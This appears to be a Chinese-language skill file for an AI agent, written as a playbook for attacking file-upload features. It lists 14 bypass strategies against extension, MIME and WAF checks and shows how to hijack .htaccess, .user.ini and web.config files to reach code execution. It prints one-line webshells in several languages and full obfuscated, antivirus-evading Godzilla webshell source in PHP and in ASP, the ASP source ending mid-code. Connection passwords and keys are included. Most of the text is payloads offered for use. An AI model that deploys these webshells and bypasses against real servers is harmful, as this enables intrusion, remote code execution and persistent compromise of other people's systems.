---
name: file-upload-testing
description: 文件上传漏洞深度测试专业技能：14种WAF绕过策略、分语言免杀WebShell、解析漏洞全场景、从黑名单绕过到RCE完整攻击链
version: 2.0.0
---

# 文件上传漏洞深度测试技能

## 概述

文件上传是Web应用高危漏洞类型，现代防护通过扩展名白/黑名单、MIME校验、Magic Bytes检测、内容扫描、WAF流量检测、重命名策略等多层防御阻断。本技能系统化覆盖**探测→绕过解析→内容免杀→组合利用→RCE**完整攻击链，覆盖PHP/ASP/ASPX/JSP/JSPX/ASMX六种语言环境，包含14种绕过策略和分语言免杀WebShell。

## 一、上传点完整攻击面

### 1.1 上传位置识别
| 位置/场景 | 测试要点 |
|----------|---------|
| 头像/图片上传 | 扩展名校验、图片二次渲染、图片马 |
| 附件/文档上传 | 白名单绕过、Office宏、PDF JS |
| 富文本编辑器 | CKEditor/UEditor/KindEditor历史漏洞 |
| 导入/批量上传 | CSV/Excel/XML外部实体导入 |
| 插件/主题上传 | CMS模板/插件上传直接拿Shell |
| 压缩包上传 | Zip Slip目录穿越、压缩包解压WebShell |
| 头像裁剪 | 裁剪后文件名/路径控制 |
| Base64上传 | JSON中base64字段、文件名参数可控 |
| URL远程抓取 | SSRF+上传（fetch remote url）|
| 分片上传 | 分片合并逻辑、文件名重组 |
| 云存储直传 | OSS/COS/S3签名直传，Bucket ACL配置 |
| WebDAV上传 | PUT/MOVE方法 |
| 日志/配置导入 | 特殊配置文件上传（.htaccess/.user.ini/web.config）|

### 1.2 防护层级识别
```
Layer 1: 前端JS校验（最易绕过）
Layer 2: 后端扩展名校验（黑名单/白名单）
Layer 3: MIME类型校验（Content-Type）
Layer 4: Magic Bytes/文件头校验
Layer 5: 文件内容检测（关键字扫描/沙箱）
Layer 6: 图片二次渲染（GD/ImageMagick）
Layer 7: 文件重命名（随机文件名）
Layer 8: 存储目录分离（非Web目录/CDN/OSS）
Layer 9: WAF/IPS流量检测（multipart解析、内容特征）
Layer 10: 中间件解析安全（handler映射）
```

## 二、探测阶段：上传防护指纹识别

### 2.1 基础探测流程
```
1. 上传合法.jpg → 观察返回路径/文件名/访问URL
2. 上传.php（不加任何混淆）→ 观察拦截：前端/WAF/后端？
3. 上传.php但Content-Type改为image/jpeg → 检测MIME校验
4. 上传.php+GIF89a文件头 → 检测Magic Bytes校验
5. 上传.php.jpg → 检测解析漏洞
6. 上传内容为<?php phpinfo();?>的.txt → 检测存储位置是否可访问执行
```

### 2.2 返回信息关键信号
| 返回现象 | 含义 |
|---------|------|
| 直接返回上传路径 | 可直接访问测试执行 |
| 返回文件ID（如/file/view?id=xxx）| 可能有下载/读取接口，测试文件包含/读取 |
| 上传到OSS/CDN域名 | 通常无法执行，但测试Bucket劫持/配置错误 |
| 文件被重命名为随机名 | 仍可解析，需获取文件名 |
| 返回"文件类型不允许" | 扩展名/MIME被拦截，进入绕过流程 |
| 返回"文件内容非法" | 内容检测，需混淆/免杀WebShell |
| 上传成功但访问404 | 目录不可访问、被删除、或需要特定路径 |
| WAF拦截页面（403/拦截页）| 进入WAF绕过流程 |

## 三、14种绕过策略深度详解

### 策略1：后缀绕过（Suffix Bypass）

服务端通过文件扩展名黑名单/白名单判断是否可上传。

**1.1 可执行扩展名变体（中间件解析特性）：**
| 语言 | 可解析罕见后缀 |
|------|--------------|
| PHP | `.php3 .php4 .php5 .phtml .pht .phar .phps .pgif .php1 .php2 .php6 .php7 .phtm .phpt .pgif .inc` |
| ASP | `.asa .cer .cdx .htr .asax .ascx .ashx .asmx .aspq .axd .rem .soap .cshtml .vbhtml` |
| ASP.NET | `.ashx .asmx .asax .ascx .soap .rem .axd .cshtm .vbhtm` |
| JSP | `.jspx .jspf .jsw .jsv .jtml .jspa .wss .do .action` |
| Perl | `.pl .pm .cgi` |
| Python | `.py .pyc .pyd .wsgi` |

**1.2 大小写变体（Windows/IIS不区分大小写）：**
```
.pHp .PhP .pHP .pHp .PHP .phP
.aSp .AsP .ASP .Asp .aSP
.JsP .jSp .JSP .Jsp .jSP
```

**1.3 双写绕过（一次性替换删除）：**
```
pphphp → 删除中间php后剩php
phphpp → 同上逻辑
aspasp / aasps / aspxaspx
jspjsp / jjsps
.pphphp → 双重替换
```
适用：代码使用`str_replace("php","",$name)`等单次替换

**1.4 空字节截断（老版本）：**
```
shell.php%00.jpg     URL编码空字节
shell.php\x00.jpg   十六进制空字节
shell.php%00        末尾截断
shell.php%2500.jpg  双重URL编码
%00截断利用条件：PHP < 5.3.4 且 magic_quotes_gpc=Off；老版本Java Servlet
```

**1.5 双扩展名顺序错位：**
```
shell.php.jpg     Apache从右向左解析/.jpg未识别则左移解析.php
shell.jpg.php     若服务端只检查第一个扩展名
shell.php.png / shell.png.php
shell.php%00.jpg  配合空字节
shell.php;.jpg    IIS 6.0分号解析
shell.jpg/.php    路径分隔符绕过
```

**1.6 尾部特殊字符（Windows特性）：**
```
shell.php.        尾点（Windows保存时自动去除）
shell.php         尾空格（Windows自动去除）
shell.php. .      多点多空格
shell.php..       双点
shell.php%20      URL编码空格
shell.php%00.%20  复合
Windows + IIS环境；代码未递归rtrim
```

**1.7 NTFS ADS交换数据流（Windows特性）：**
```
shell.php::$DATA          NTFS默认数据流
shell.php:$DATA           变体
shell.php::$INDEX_ALLOCATION
shell.php::$DATA......    多点尾部
Windows访问原文件，但黑名单匹配到::认为无扩展名
```

**1.8 IIS分号解析漏洞（IIS 6.0）：**
```
shell.asp;.jpg
shell.asp;.png
shell.asp;jpg
shell.php;.jpg（特定配置）
IIS 6.0中分号后视为查询参数，实际解析.asp
配合畸形目录：/test.asp/1.jpg → test.asp被当作脚本执行
```

**1.9 路径分隔符欺骗：**
```
shell.php/.jpg
shell.php\.jpg
shell.php%2f.jpg   /编码
shell.php%5c.jpg   \编码
../shell.php       路径穿越（若保存路径拼接）
```

**1.10 URL编码片段：**
```
p%68p          %68=h → php
%70hp          %70=p → php
ph%70          %70=p
shell.%70hp    %70=p
p%68%70        全编码
%2570hp        双重编码（WAF一次decode得%70hp，后端二次得php）
```

**1.11 扩展名中间插入特殊字符：**
```
p;hp / p hp / ph p / p.hp / p%20hp
a;sp / as p / a.sp / a%20sp
j;sp / js p / j.sp / j%20sp
若代码使用==或in做严格后缀匹配而非endswith()
```

---

### 策略2：Content-Disposition头操控（Multipart解析差异）

利用WAF/代理与应用服务器对multipart头部解析的差异（Parser Differential）。

**2.1 头名大小写变形：**
```http
content-disposition: form-data; name="file"; filename="shell.php"
CONTENT-DISPOSITION: form-data; name="file"; filename="shell.php"
Content-disposition: form-data; name="file"; filename="shell.php"
ConTENT-DisPoSition: form-data; name="file"; filename="shell.php"
```

**2.2 冒号后空格变形：**
```http
Content-Disposition:form-data; name="file"; filename="shell.php"     (去空格)
Content-Disposition:  form-data; name="file"; filename="shell.php"   (双空格)
Content-Disposition:	form-data; name="file"; filename="shell.php"  (Tab)
```

**2.3 form-data值变形：**
```http
Content-Disposition: Form-Data; name="file"; filename="shell.php"
Content-Disposition: FORM-DATA; name="file"; filename="shell.php"
Content-Disposition: form-datA; name="file"; filename="shell.php"
Content-Disposition: f+orm-data; name="file"; filename="shell.php"
Content-Disposition: AAAA="BBBB"; name="file"; filename="shell.php"
Content-Disposition: form-data;;;;;;;;;; name="file"; filename="shell.php"
Content-Disposition: name="file"; filename="shell.php"  （删除form-data）
```

**2.4 引号变化：**
```http
Content-Disposition: form-data; name=file; filename=shell.php         (无引号)
Content-Disposition: form-data; name='file'; filename='shell.php'     (单引号)
Content-Disposition: form-data; name=`file`; filename=`shell.php`     (反引号)
```

**2.5 未闭合引号：**
```http
Content-Disposition: form-data; name="file"; filename="shell.php
Content-Disposition: form-data; name="file"; filename='shell.php
Content-Disposition: form-data; name="file"; filename="shell.php'
```

**2.6 多等号：**
```http
Content-Disposition: form-data; name=="file"; filename=="shell.php"
Content-Disposition: form-data; name==="file"; filename==="shell.php"
Content-Disposition: form-data; name="file"; filename======================================"shell.php"
```

**2.7 换行注入：**
```http
Content-Disposition: form-data; name="file"; filename="shell.php"

Content-Disposition: form-data; name="file"
filename="shell.php"

Content-Disposition: form-data; name="file"; filename=
"shell.php"
```

**2.8 HPP参数污染：**
```http
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename= ;filename="shell.php"
Content-Disposition: form-data; name="file"; filename="";filename="shell.php"
（WAF取第一个safe.jpg，应用取最后一个shell.php）
```

**2.9 反斜杠/多分号污染：**
```http
Content-Disposition: form-data; name="file"; filename="shell\php"
Content-Disposition: form-data;;;;; name="file";;;;;;;;; filename="shell.php"
Content-Disposition: form-data; name="file";;;;;;;;;;;;;;;;;;;;;;;;;;;;;; filename="shell.php"
```

---

### 策略3：Content-Type绕过

**3.1 MIME类型伪装：**
```http
# 图片MIME（白名单image/*场景）
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: image/webp
Content-Type: image/svg+xml
Content-Type: image/tiff

# 通用/模糊MIME
Content-Type: text/plain
Content-Type: text/html
Content-Type: application/octet-stream

# 直接声明可执行类型（测试是否未拦截）
Content-Type: application/x-httpd-php
Content-Type: application/x-php
Content-Type: application/x-asp

# 伪造前缀匹配
Content-Type: image/php       （若代码只匹配image/前缀）
Content-Type: image/asp
Content-Type: image/aspx
Content-Type: image/jsp

# URL编码MIME
Content-Type: image%2Fgif
Content-Type: image%2Fjpeg
Content-Type: image%2Fphp

# 空/删除Content-Type
Content-Type: 
（删除Content-Type头）
```

**3.2 大小写/空格变形：**
```http
content-type: image/jpeg
CONTENT-TYPE: IMAGE/JPEG
Content-Type:image/jpeg       (去空格)
Content-Type:  image/jpeg     (双空格)
```

**3.3 双Content-Type头：**
```http
Content-Type: image/gif
Content-Type: application/x-httpd-php
（RFC规定同名头应合并/后者覆盖；不同服务器处理不同）
```

---

### 策略4：Windows特性利用

| 技术 | Payload | 原理 |
|------|---------|------|
| NTFS ADS | `shell.php::$DATA`、`shell.php:$DATA` | NTFS数据流属性，Windows剥离后访问原文件 |
| IIS 6.0分号 | `shell.asp;.jpg` | 分号后视为查询参数 |
| Windows保留设备名 | `con.php`、`aux.php`、`nul.php`、`prn.php`、`com1.php`、`com2.php`、`lpt1.php` | 不允许保存，可能触发异常/兜底逻辑 |
| 尾部点/空格 | `shell.php.`、`shell.php ` | Windows自动去除 |

**利用条件：** Windows服务器 + IIS（尤其IIS 6.0/7.0/7.5经典模式）

---

### 策略5：Linux/Apache/Nginx特性利用

| 技术 | Payload | 原理 |
|------|---------|------|
| Apache多扩展名解析 | `shell.php.jpg`、`shell.php.png` | AddHandler配置含.php则任何位置有.php就解析 |
| Nginx解析漏洞 | `shell.jpg/.php`、`shell.jpg%00.php` | 老版Nginx错误配置导致php解析 |
| Nginx文件名逻辑漏洞(CVE-2013-4547) | `shell.jpg%00.php`（空格+\0+php）| 路径处理错误 |
| Apache换行解析(CVE-2017-15715) | `shell.php%0a` | 6d2d7426版本mod_php换行绕过 |
| 路径穿越 | `../shell.php`、`....//shell.php` | `....//`绕过一次性删除../ |
| 隐藏文件 | `.shell.php` | Linux.开头隐藏文件，绕过列目录检查 |
| Apache HTTPD CVE-2021-41773/42013 | 路径穿越+CGI执行 | 2.4.49/2.4.50 |

---

### 策略6：魔术字节伪造（Magic Bytes）

服务端通过读取文件头字节判断文件类型（getimagesize()、file命令）。

**常用魔术字节表：**
| 文件类型 | 魔术字节(Hex) | 字符表示 |
|---------|-------------|---------|
| JPG | `FF D8 FF E0` | `\xff\xd8\xff\xe0` |
| JPG(EXIF) | `FF D8 FF E1` | `\xff\xd8\xff\xe1` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| GIF87 | `47 49 46 38 37 61` | `GIF87a` |
| BMP | `42 4D` | `BM` |
| PDF | `25 50 44 46 2D 31 2E 35` | `%PDF-1.5` |
| ZIP | `50 4B 03 04` | `PK\x03\x04` |
| RAR | `52 61 72 21 1A 07` | `Rar!\x1a\x07` |
| 7Z | `37 7A BC AF 27 1C` | `7z\xbc\xaf'\x1c` |
| WAV | `52 49 46 46` | `RIFF` |
| MP3 | `49 44 33` | `ID3` |

**Payload结构（图片马）：**
```
Content-Type: image/jpeg

[GIF89a]<?php @eval($_POST["cmd"]); ?>

或
Content-Type: image/png

[\x89PNG\r\n\x1a\n]<?php @eval($_POST["cmd"]); ?>
```

**关键注意：**
- 魔术字节只插入到Content-Type头之后的文件内容开头
- 文件扩展名仍改为.php/.jsp等可执行后缀
- 若开启图片二次渲染（GD库处理），普通图片马可能失效，需将代码注入到图片的EXIF/注释等不被渲染破坏的位置
- 配合文件包含漏洞使用时扩展名可以是.jpg

---

### 策略7：空字节注入

**空字节编码变体：**
```
%00           URL编码空字节
\0            C风格转义
\x00          十六进制空字节
原始\x00字节   二进制0
%2500         双重URL编码
%u0000        Unicode空字节（Java/.NET）
```

**截断位置组合：**
```
shell.php%00.jpg     可执行扩展名和白名单扩展名之间
shell.php%00jpg      无点号
shell%00.php         文件名和扩展名之间
shell.php%00.        末尾截断
```

**利用条件：**
- PHP < 5.3.4 且 magic_quotes_gpc=Off
- 旧版Java Servlet容器
- C/C++编写的原生模块

---

### 策略8：编码绕过

**8.1 URL编码扩展名：**
```
shell.%70%68%70    (=php)
shell.%61%73%70    (=asp)
shell.%6a%73%70    (=jsp)
shell.%61%73%70%78 (=aspx)
```

**8.2 双重URL编码：**
```
shell.%2570%2568%2570    (decode一次→%70%68%70→两次→php)
```

**8.3 MIME编码（RFC 2047）：**
```
=?utf-8?B?c2hlbGwucGhw?=     (B编码Base64 = shell.php)
=?utf-8?Q?shell=2Ephp?=      (Q编码Quoted-Printable)
```

**8.4 Unicode等价字符：**
```
shell.ph\x70       (\x70='p')
shell.p\u0068p     (\u0068='h')
利用Unicode归一化(NFC/NFD)，ASCII等价字符被归一化
```

**8.5 罕见编码：**
```
%u0070%u0068%u0070     Unicode编码(=php)
%uff05%u0070           全角百分号+编码
```

---

### 策略9：WAF绕过（流量层）

**9.1 超长文件名：**
```
AAAAAAAAA...(200-5000个A)...A.php
触发WAF缓冲区截断/溢出；某些WAF只检查前N个字节，超过后放过
```

**9.2 多点/特殊文件名：**
```
shell.....php
shell.php..................
shell.p.h.p
```

**9.3 垃圾头注入：**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
X-Junk: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(500-5000个A)
X-Decoy: aaa
X-Filler: bbb...

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
------WebKitFormBoundary--
```

**9.4 Transfer-Encoding: chunked（分块编码）：**
```http
POST /upload HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1f
------WebKitFormBoundary
1a
Content-Disposition: form-data
15
; name="file"; filename=
9
"shell.php
17
"
Content-Type: image/jpeg

0

（分块编码；某些WAF不完整支持chunked解码，看到的是分块长度行而非真实内容）
```

**9.5 双重Content-Disposition：**
```http
Content-Disposition: form-data; name="decoy"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php"
（WAF取第一个safe.jpg放行，应用取第二个）
```

**9.6 Boundary注入：**
```
boundary=----WebKitFormBoundary; shell.php
boundary=---------------------------shell.php
boundary=----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"; name="file"; filename="shell.php"
```

**9.7 大文件前缀填充：**
在恶意内容前填充大量合法内容（如图片数据/正常文本），让WAF扫描只检测前N字节而放过后面的恶意代码。

---

### 策略10：配置文件上传（将上传目录变为执行点）

若能上传到Web可访问目录且服务器会解析配置文件，可将图片上传目录变成代码执行点。

**10.1 Apache .htaccess：**
```apache
# 将当前目录所有文件交给PHP解析
SetHandler application/x-httpd-php

# 让特定图片扩展名被PHP解析
AddType application/x-httpd-php .jpg .png .gif

# 通配所有文件作为PHP
<FilesMatch ".*">
SetHandler application/x-httpd-php
</FilesMatch>

# 启用CGI执行
Options +ExecCGI
AddHandler cgi-script .jpg
```

**利用链：**
```
1. 上传.htaccess（SetHandler application/x-httpd-php）
2. 上传shell.jpg（内容<?php eval($_POST[cmd]); ?>）
3. 访问 http://target/upload/shell.jpg → 执行PHP
```

**10.2 PHP .user.ini（CGI/FastCGI模式）：**
```ini
; 每个PHP文件执行前自动include指定文件
auto_prepend_file=shell.gif
auto_append_file=shell.gif
```

**利用链：**
```
1. 上传.user.ini（auto_prepend_file=shell.gif）
2. 上传shell.gif（GIF89a + <?php phpinfo(); ?>）
3. 访问该目录下任意.php文件 → 自动include shell.gif执行
```

**10.3 IIS web.config：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="shelljpg" path="*.jpg" verb="*" modules="IsapiModule" 
           scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll" 
           resourceType="Unspecified" preCondition="classicMode,runtimeVersionv4.0,bitness32"/>
    </handlers>
  </system.webServer>
</configuration>
```

**10.4 Nginx配置错误（非上传文件，但需检测）：**
- `cgi.fix_pathinfo=1`导致任意文件作为PHP解析
- Nginx + Apache后端解析差异

**利用前提：**
1. 上传目录必须是Web可访问目录
2. AllowOverride All（对.htaccess）
3. PHP以CGI/FastCGI运行（对.user.ini）
4. IIS允许web.config覆盖
5. 配置文件未被黑名单拦截（需要配合策略1-9绕过）

---

### 策略11：WebShell内容注入

**11.1 最小一句话WebShell（各语言）：**

**PHP：**
```php
<?php @eval($_POST["cmd"]); ?>
<?php @system($_REQUEST["cmd"]); ?>
<?= `$_GET[0]`; ?>                                      短标签+反引号
<?php $_GET[a]($_GET[b]); ?>                            可变函数 (a=system&b=whoami)
<?php assert($_POST["cmd"]); ?>                         assert（PHP 7.1前）
<?php @preg_replace('/./e',$_POST['cmd'],''); ?>        preg_replace /e修饰符
<?php @call_user_func($_POST['f'],$_POST['p']); ?>      回调函数
<?php @array_map($_GET['f'],array($_GET['p'])); ?>      array_map
<?php include($_GET['f']); ?>                           文件包含
```

**ASP：**
```asp
<%eval request("cmd")%>
<%execute request("cmd")%>
<%ExecuteGlobal request("cmd")%>
<%eval request(chr(99)&chr(109)&chr(100))%>            chr拼接
<%Set o=Server.CreateObject("WScript.Shell"):o.Exec("cmd /c "&request("cmd"))%>
```

**ASPX：**
```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start("cmd.exe","/c "+Request["cmd"]);%>
<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request["b"])).CreateInstance("X").Equals(null);%>
```

**JSP：**
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));java.io.InputStream in=p.getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}%>
```

**JSPX：**
```jspx
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page contentType="text/html"/><jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet></jsp:root>
```

**11.2 双重Payload结构（图片马）：**
每种魔术字节（6种）×每种WebShell（5种语言）=30种组合，同时绕过内容检测和扩展名/MIME检测。

---

### 策略12：特殊字符注入

在文件名中插入特殊字符，测试边界情况和解析器异常处理。

**字符集：**
```
空白符：空格 \t \n \r
Windows非法文件名字符：/ \ : * ? " < > |
Shell/URL元字符：; & $ ` ' # @ ! ^ % ( ) [ ] { }
```

**注入位置：**
```
1. 扩展名前：shell{char}php
2. 扩展名后：shell.php{char}
3. 扩展名中间：ph{char}p / sh{char}ell.php
4. 文件名与点之间：shell{char}.php
5. 点后空格：shell. php
6. 多点：shell...php / shell.....php
```

**目标效果：**
- 正则匹配失败（尾字符干扰`\.(php|asp)$`）
- 触发数据库/文件系统异常进入兜底分支
- 触发XSS/SQLi次要漏洞（文件名回显场景）
- endswith()/split('.')产生非预期结果

---

### 策略13：大小写变换

系统生成大小写变体绕过严格匹配：
```
php  → php PHP Php phP pHp pHP PhP
asp  → asp ASP Asp aSp AsP aSP
aspx → aspx ASPX Aspx aSpx AsPx aSPx asPx aSpX ASPx
jsp  → jsp JSP Jsp jSp jsP jSP JsP JSp
```

利用场景：
- Windows/IIS（大小写不敏感）：绕过严格小/大写黑名单
- Linux/Apache：若handler配置成了*.PHP也能生效
- Nginx：`location ~*\.php$`大小写不敏感匹配

---

### 策略14：双/多扩展名

**白名单扩展名池：** jpg/jpeg/png/gif/bmp/txt/pdf/doc/xls/zip/rar

**组合模式：**
| 模式 | 示例 | 利用点 |
|------|------|--------|
| 可执行在前，白名单在后 | `shell.php.jpg` | Apache从右向左解析，未知扩展名左移 |
| 白名单在前，可执行在后 | `shell.jpg.php` | 服务端只检查第一个扩展名 |
| 三扩展名 | `shell.jpg.php.jpg` | 头尾白名单，中间.php绕过检查 |
| Nginx老漏洞 | `shell.jpg/shell.php`、`shell.jpg%00.php` | Nginx解析错误 |
| Apache HTTPD | `shell.php.jpg` (AddHandler) | 任意位置含.php即解析 |

---

## 四、免杀WebShell（Godzilla哥斯拉）

### 4.1 Godzilla连接配置

各语言WebShell的Godzilla连接参数：

| 类型 | 密码 | 密钥 | 有效载荷 | 加密器 |
|------|------|------|---------|--------|
| **ASP** | `Tas9er` | `qME87e` | AspDynamicPayload | ASP_XOR_BASE64 |
| **ASPX** | `Tas9er` | `PH3HO3qZytBgRwT` | CShapDynamicPayload | CSHAP_AES_BASE64 |
| **ASMX** | `Tas9er` | `FVvv` | CShapDynamicPayload | CSHAP_ASMX_AES_BASE64 |
| **PHP** | `Tas9er` | `5yTsw` | PhpDynamicPayload | PHP_XOR_BASE64 |
| **JSP** | `Tas9er` | `YeUJ` | JavaDynamicPayload | JAVA_AES_BASE64 |
| **JSPX** | `Tas9er` | `VsTF` | JavaDynamicPayload | JAVA_AES_BASE64 |

**免杀特征说明：**
- 所有函数名/变量名使用随机混淆命名
- 字符串拼接绕过关键字检测（`"sys"."tem"`、`Chr(XX)`拼接）
- 插入随机垃圾注释（如`/*fuckgovxxxxx*/`）
- 使用XOR/AES加密通信流量
- Session持久化机制
- 支持动态加载Payload（内存加载，不落盘）
- 响应前后添加固定md5分割标记（如`c0d751`和`cd2765`）

### 4.2 PHP免杀WebShell（Godzilla PHP_XOR_BASE64）

**特征：**
- 密码参数名通过字符运算动态生成（`("&"^"r").("7"^"V")...`）
- XOR加密+Base64编码
- Session持久化Payload
- 随机垃圾注释分割关键字
- Chr()函数拼接数字字符串
- @抑制错误

```php
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*fuckgovsgM07w3jd*/(Chr("48"));
function baiduYS37b(/*fuckgov8jHj8*/$baiduto7Tgxst,$baidub){
    for($baidu049dWkwJi=Chr("48");$baidu049dWkwJi<strlen($baiduto7Tgxst);$baidu049dWkwJi++) {
        $baidukH0XLu0GGbPk = $baidub[$baidu049dWkwJi+Chr("49")&15];
        $baiduto7Tgxst[$baidu049dWkwJi] = $baiduto7Tgxst[$baidu049dWkwJi]^$baidukH0XLu0GGbPk;
    }
    return $baiduto7Tgxst;
}
$baidun7JboDC9 = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_baiduYS37b = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$baidu1wzKJXP8fek=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baidun7JboDC9($baidun7JboDC9("Y2c9PQ=="));
$baiduQt='p'.$baidun7JboDC9($baidun7JboDC9("WVhsc2IyRms="));
$baidu8ffjKi0yUvaCM9p='ba6fb5e9'.$baidun7JboDC9("MWUyMjZkMDc=");
$baiduZhv8g3Ew0D=("!"^"@").'ss'.Chr("101").'rs';
$baiduZhv8g3Ew0D++;
if (isset($_POST/*fuckgovYsGxozblTdqCcF*/[$baidu1wzKJXP8fek])){
    $datbaiduZhv8g3Ew0D=baiduYS37b/*fuckgovv6Pnk31j*/($baidun7JboDC9($_POST[$baidu1wzKJXP8fek]),$baidu8ffjKi0yUvaCM9p);
    if (/*fuckgov84YP89l6MQj*/isset($_SESSION/*fuckgoviKC2FSv8oSi*/[$baiduQt])){
        $baiduk50=baiduYS37b($_SESSION/*fuckgovk*/[$baiduQt],$baidu8ffjKi0yUvaCM9p);
        if(/*fuckgovfVgPQn*/strpos($baiduk50,$baidun7JboDC9/*fuckgovcpsO7MDpxyKuCg9*/($baidun7JboDC9("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
            $baiduk50=baiduYS37b/*fuckgovMChbRBWzm4h*/($baiduk50,$baidu8ffjKi0yUvaCM9p);
        }
        define("baiducO7pe","//baiduhWAzEz3wYxr7\r\n".$baiduk50);
        $baiduZhv8g3Ew0D(baiducO7pe);
        echo substr(/*fuckgovVu6pkZ2tMrl*/md5/*fuckgovbMtDpRZBHLkg2fL*/($baidu1wzKJXP8fek.$baidu8ffjKi0yUvaCM9p),Chr("48"),16);
        echo $base64_baiduYS37b(baiduYS37b(@run($datbaiduZhv8g3Ew0D),$baidu8ffjKi0yUvaCM9p));
        echo substr(/*fuckgovEx66zlhC*/md5/*fuckgoviSGd*/($baidu1wzKJXP8fek.$baidu8ffjKi0yUvaCM9p),16);
    }else{
        if(strpos/*fuckgovokb1ktWWj*/($datbaiduZhv8g3Ew0D,$baidun7JboDC9($baidun7JboDC9("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
            $_SESSION[$baiduQt]=baiduYS37b($datbaiduZhv8g3Ew0D,$baidu8ffjKi0yUvaCM9p);
        }
    }
}
?>
```

### 4.3 ASP免杀WebShell（Godzilla ASP_XOR_BASE64）

**特征：**
- XOR加密+Base64编码，密钥`cda835a7de057d52`
- Scripting.Dictionary存储payload
- ADODB.Stream进行二进制/文本转换
- Chr()拼接绕过关键字检测
- Session持久化payload
- 随机垃圾注释`<!--"-->`和`<%'caonimaXXX%>`分割
- MD5响应标记：`c0d751`和`cd2765`
- 密码参数名通过Chr()拼接：`Tas9er`

```asp
Hello Administrator!
WelCome To Tas9er Godzilla ASP Console!
<%
Set shabi4W = SeRveR.CrEateObJeCt("Scr"&"ipti"&"ng.Di"&"ct"&"ion"&"ar"&Chr("121"))
<!--"-->
FunCtioN shabi1xTuqJJYdE(ByVal shabigyff)
	<!--"-->
    DIm shabiS, shabiwNH6KweBTlF6
    SEt shabiS = CReAteOBjeCt("Ms"&"xm"&"l"&Chr("50")&".DO"&"MDo"&"cume"&"nt.3."&Chr("48"))
	<!--"-->
    SeT shabiwNH6KweBTlF6 = shabiS.CreateElement("base"&Chr("54")&Chr("52"))
	<!--"-->
    shabiwNH6KweBTlF6.daTaTyPe = "bi"&"n.ba"&"se"&Chr("54")&Chr("52")
    shabiwNH6KweBTlF6.tExT = shabigyff
	<!--"-->
    shabi1xTuqJJYdE = shabiwNH6KweBTlF6.noDeTypeDVAlue
	<!--"-->
    SEt shabiwNH6KweBTlF6 = Nothing
	<!--"-->
    SeT shabiS = Nothing
EnD FunCTioN
%><%'caonimaVAxUNLR5FF%><%
FUNctIon shabiRXmLdTODUD7Y0i(shabirD60UrdOZKHtT,shabiwzR)
	<!--"-->
    diM shabijvgEME5g,shabiyA3cokwy,shabiGePxQQEqvk,shabiOi
    shabiOi = lEn(shabijisiDLbHbOBli)
	<!--"-->
    Set shabi5JpnlVt = CrEATeObjecT("AD"&"OD"&"B.St"&"re"&Chr("97")&Chr("109"))
	<!--"-->
    shabi5JpnlVt.ChArsET = "is"&"o-8"&"85"&"9-"&Chr("49")
    shabi5JpnlVt.TYPe = Chr("50")
    shabi5JpnlVt.OpeN
	<!--"-->
    if IsArray(shabirD60UrdOZKHtT) then
        shabijvgEME5g=UBoUNd(shabirD60UrdOZKHtT)+Chr("49")
		<!--"-->
        For shabiyA3cokwy=Chr("49") To shabijvgEME5g
            shabi5JpnlVt.WritETeXt chRw(asCB(mIDb(shabirD60UrdOZKHtT,shabiyA3cokwy,Chr("49"))) Xor Asc(MiD(shabijisiDLbHbOBli,(shabiyA3cokwy mOd shabiOi)+Chr("49"),Chr("49"))))
			<!--"-->
        Next
    end if
    shabi5JpnlVt.PoSItiOn = Chr("48")
	<!--"-->
    if shabiwzR then
        shabi5JpnlVt.TYpE = Chr("49")
		<!--"-->
        shabiRXmLdTODUD7Y0i=shabi5JpnlVt.ReAd()
		<!--"-->
    else
        shabiRXmLdTODUD7Y0i=shabi5JpnlVt.ReAdTeXt()
		<!--"-->
    end if
End Function
%><%'caonimaxeDxT21pbrHGHXL%><%
    shabijisiDLbHbOBli=Chr("99")&Chr("100")&Chr("97")&Chr("56")&Chr("51")&Chr("53")&Chr("97")&Chr("55")&Chr("100")&Chr("101")&Chr("48")&Chr("53")&Chr("55")&Chr("100")&Chr("53")&Chr("50")
	<!--"-->
    shabirD60UrdOZKHtT=reQUest.FoRm(Chr("84")&Chr("97")&Chr("115")&Chr("57")&Chr("101")&Chr("114"))
	<!--"-->
    if not IsEmpty(shabirD60UrdOZKHtT) then
        if  IsEmpty(SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))) then
            shabirD60UrdOZKHtT=shabiRXmLdTODUD7Y0i(shabi1xTuqJJYdE(shabirD60UrdOZKHtT),false)
			<!--"-->
            SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))=shabirD60UrdOZKHtT
			<!--"-->
